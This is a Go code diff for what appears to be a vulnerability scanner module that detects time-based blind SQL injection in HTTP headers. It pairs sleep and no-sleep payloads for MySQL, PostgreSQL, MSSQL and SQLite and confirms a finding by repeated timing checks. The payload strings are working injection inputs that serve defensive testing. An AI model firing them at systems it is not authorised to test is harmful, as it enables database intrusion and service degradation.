@@ -1,7 +1,7 @@
 package sqli_time_based_header
 
 import (
-	"strings"
+	"time"
 
 	"github.com/vigolium/vigolium/pkg/core/hosterrors"
 	"github.com/vigolium/vigolium/pkg/http"
@@ -12,6 +12,32 @@ import (
 	"github.com/pkg/errors"
 	"github.com/projectdiscovery/useragent"
 )
+
+// sleepThreshold is the minimum response time to consider a timing injection confirmed.
+const sleepThreshold = 12 * time.Second
+
+// headerTimePair represents a sleep/no-sleep payload pair.
+type headerTimePair struct {
+	dbType   string
+	sleepVal string
+	noSleep  string
+}
+
+// payloadPairs contains sleep/no-sleep pairs for each DB type.
+var payloadPairs = []headerTimePair{
+	// MySQL
+	{dbType: "mysql", sleepVal: "'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z", noSleep: "'XOR(if(now()=sysdate(),SLEEP(0),0))XOR'Z"},
+	{dbType: "mysql", sleepVal: `"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`, noSleep: `"XOR(if(now()=sysdate(),SLEEP(0),0))XOR"Z`},
+	// PostgreSQL
+	{dbType: "postgres", sleepVal: "1233'||(select 99999999 from pg_sleep(15))||'1233", noSleep: "1233'||(select 99999999 from pg_sleep(0))||'1233"},
+	{dbType: "postgres", sleepVal: `1233"||(select 99999999 from pg_sleep(15))||"1233`, noSleep: `1233"||(select 99999999 from pg_sleep(0))||"1233`},
+	// MSSQL
+	{dbType: "mssql", sleepVal: "9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999", noSleep: "9999' or 1=0 or '0'='9999"},
+	{dbType: "mssql", sleepVal: `9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`, noSleep: `9999" or 1=0 or "0"="9999`},
+	// SQLite
+	{dbType: "sqlite", sleepVal: `9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`, noSleep: `9999'||(select 1)||'9999`},
+	{dbType: "sqlite", sleepVal: `9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`, noSleep: `9999"||(select 1)||"9999`},
+}
 
 type Module struct {
 	modkit.BaseActiveModule
@@ -55,7 +81,6 @@ func (m *Module) ScanPerRequest(
 		return results, nil
 	}
 
-	// Header keys with their default values for fuzzing
 	headerKeys := map[string]string{
 		"User-Agent":       useragent.PickRandom().String(),
 		"X-Forwarded-For":  "127.0.0.1",
@@ -63,103 +88,109 @@ func (m *Module) ScanPerRequest(
 		"Referer":          urlx.String(),
 		"Origin":           urlx.String(),
 	}
-	// https://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
-	payloads := []string{
-		// Mysql
-		"'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z",
-		`"XOR(if(now()=sysdate(),SLEEP(7),0))XOR"Z`,
-		// PostgreSQL
-		"1233'||(select 99999999 from pg_sleep(7))||'1233",
-		`1233"||(select 99999999 from pg_sleep(7))||"1233`,
-		// MSSQL
-		// "9999' WAITFOR DELAY '00:00:07' -- ",
-		// "9999\" WAITFOR DELAY '00:00:07' -- ",
-		"9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999",
-		`9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`,
-		// SQLite
-		`9999'||(select like('abcdefg',upper(hex(randomblob(70000000)))))||'9999`,
-		`9999"||(select like('abcdefg',upper(hex(randomblob(70000000)))))||"9999`,
-	}
 
 scan:
-	for _, payload := range payloads {
-		// Build fuzzed request by replacing headers using httpmsg
-		fuzzedRaw := ctx.Request().Raw()
-		for key, value := range headerKeys {
-			completePayload := value + payload
-			var err error
-			fuzzedRaw, err = httpmsg.ReplaceHeader(fuzzedRaw, key, completePayload)
-			if err != nil {
-				continue scan
-			}
-		}
-
-		// Parse the fuzzed raw request to HttpRequestResponse
-		fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
+	for _, pair := range payloadPairs {
+		// Step 1: Send sleep payload (should be slow)
+		sleepRaw, err := m.buildHeaderRequest(ctx, headerKeys, pair.sleepVal)
 		if err != nil {
 			continue
 		}
-
-		// Copy HttpService from original request
-		fuzzedReq = fuzzedReq.WithService(ctx.Service())
-
-		var isVuln bool
-		var sendErr error
-		isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
-		if sendErr != nil {
+		elapsed1, err := m.sendTimedRequest(sleepRaw, ctx, httpClient)
+		if err != nil {
+			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
+				return results, nil
+			}
 			continue
 		}
-		// retry 3 times, if all are true, then it is vuln
-		for i := 0; i < 3; i++ {
-			isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
-			if sendErr != nil {
-				continue
-			}
-			if !isVuln {
-				break
-			}
+		if elapsed1 < sleepThreshold {
+			continue
 		}
 
-		// check isVuln and sendErr == nil (successful request)
-		if isVuln && sendErr == nil {
-			fuzzedURL, _ := fuzzedReq.URL()
-			var urlStr string
-			if fuzzedURL != nil {
-				urlStr = fuzzedURL.String()
-			}
-			results = append(results, &output.ResultEvent{
-				URL:              urlStr,
-				Request:          string(fuzzedRaw),
-				FuzzingParameter: "Header",
-				ExtractedResults: []string{payload},
-			})
-			break scan
+		// Step 2: Send no-sleep payload (should be fast)
+		noSleepRaw, err := m.buildHeaderRequest(ctx, headerKeys, pair.noSleep)
+		if err != nil {
+			continue
 		}
+		elapsedNoSleep, err := m.sendTimedRequest(noSleepRaw, ctx, httpClient)
+		if err != nil {
+			continue
+		}
+		if elapsedNoSleep >= sleepThreshold {
+			continue // Server is just slow, not injectable
+		}
+
+		// Step 3: Send sleep payload again (should be slow again)
+		elapsed2, err := m.sendTimedRequest(sleepRaw, ctx, httpClient)
+		if err != nil {
+			continue
+		}
+		if elapsed2 < sleepThreshold {
+			continue // Inconsistent — likely false positive
+		}
+
+		// All checks passed — confirmed
+		fuzzedURL, _ := ctx.URL()
+		var urlStr string
+		if fuzzedURL != nil {
+			urlStr = fuzzedURL.String()
+		}
+		results = append(results, &output.ResultEvent{
+			URL:              urlStr,
+			Request:          string(sleepRaw),
+			FuzzingParameter: "Header",
+			ExtractedResults: []string{pair.sleepVal, pair.noSleep, pair.dbType},
+			Info: output.Info{
+				Description: "Time-based blind SQL injection in HTTP headers confirmed via triple verification " +
+					"(sleep/no-sleep/sleep). Database type: " + pair.dbType,
+			},
+		})
+		break scan
 	}
 
 	return results, nil
 }
 
-func sendRequest(req *httpmsg.HttpRequestResponse, httpClient *http.Requester) (bool, error) {
-	timeout := false
-	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
+// buildHeaderRequest creates a fuzzed request with the payload injected into all target headers.
+func (m *Module) buildHeaderRequest(
+	ctx *httpmsg.HttpRequestResponse,
+	headerKeys map[string]string,
+	payload string,
+) ([]byte, error) {
+	fuzzedRaw := ctx.Request().Raw()
+	for key, value := range headerKeys {
+		completePayload := value + payload
+		var err error
+		fuzzedRaw, err = httpmsg.ReplaceHeader(fuzzedRaw, key, completePayload)
+		if err != nil {
+			return nil, err
+		}
+	}
+	return fuzzedRaw, nil
+}
+
+// sendTimedRequest parses and sends a raw request, returning the elapsed duration.
+func (m *Module) sendTimedRequest(
+	raw []byte,
+	ctx *httpmsg.HttpRequestResponse,
+	httpClient *http.Requester,
+) (time.Duration, error) {
+	fuzzedReq, err := httpmsg.ParseRawRequest(string(raw))
 	if err != nil {
-		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
-			return false, nil
-		}
-		if strings.Contains(err.Error(), "timeout awaiting response headers") {
-			timeout = true
-		}
+		return 0, err
+	}
+	fuzzedReq = fuzzedReq.WithService(ctx.Service())
+
+	start := time.Now()
+	resp, _, err := httpClient.Execute(fuzzedReq, http.Options{IgnoreTimeoutTracking: true})
+	elapsed := time.Since(start)
+
+	if err != nil {
+		return 0, err
+	}
+	if resp != nil {
+		resp.Close()
 	}
 
-	defer func() {
-		if resp != nil {
-			resp.Close()
-		}
-	}()
-
-	if duration >= 15 || timeout {
-		return true, nil
-	}
-	return false, nil
+	return elapsed, nil
 }
